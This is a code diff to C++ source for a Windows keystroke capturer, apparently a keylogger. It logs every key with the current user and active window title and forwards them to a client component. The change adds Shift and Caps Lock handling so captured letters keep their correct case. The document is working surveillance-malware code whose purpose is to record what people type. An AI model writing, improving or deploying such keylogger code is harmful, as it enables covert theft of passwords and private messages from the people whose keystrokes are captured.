@@ -59,7 +59,16 @@ void CapturerWin::run()
                 KeyDataStruct keyData;
                 keyData.User = _user;
                 keyData.WindowTitle = (strlen(title) == 0 ? "NO ACTIVE WINDOW" : title);
-                keyData.Key = GeyKey(c);
+
+                // If alpha key, check for case.
+                if (GeyKey(c, keyData.Key))
+                {
+                    if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x1)
+                        boost::to_upper(keyData.Key);
+                    else
+                        boost::to_lower(keyData.Key);
+                }
+
                 _client->AddKeyInfo(keyData);
 
                 //std::cout << ">" << GeyKey(c) << "< (" << (unsigned)c << ")" << std::endl;
@@ -69,10 +78,8 @@ void CapturerWin::run()
     }
 }
 
-std::string CapturerWin::GeyKey(unsigned char c)
+bool CapturerWin::GeyKey(unsigned char c, std::string &key)
 {
-    std::string key;
-
     switch (c)
     {
         case 1:
@@ -191,7 +198,10 @@ std::string CapturerWin::GeyKey(unsigned char c)
             else if (c >= 112 && c <= 123)
                 key = "[F" + intToString(c - 111) + "]";
             else if (c >= 65 && c <= 90 || c >= 48 && c <= 57 || c == 32)
+            {
                 key = c;
+                return true;
+            }
             else // Default alpha key
                 key = "[KEY: " + intToString(c) + "]";
 
@@ -199,7 +209,7 @@ std::string CapturerWin::GeyKey(unsigned char c)
         }
     }
 
-    return key;
+    return false;
 }
 
 std::string CapturerWin::intToString(unsigned short i)
